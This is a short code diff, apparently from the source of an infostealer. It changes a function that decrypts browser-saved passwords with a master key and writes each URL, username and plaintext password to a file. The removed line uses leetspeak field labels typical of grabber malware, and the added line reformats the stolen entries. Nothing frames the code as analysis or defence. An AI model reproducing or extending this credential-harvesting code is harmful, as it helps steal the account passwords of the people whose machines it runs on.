@@ -563,7 +563,7 @@ def getPassw(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in paswWords: paswWords.append(old)
-            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
+            Passw.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
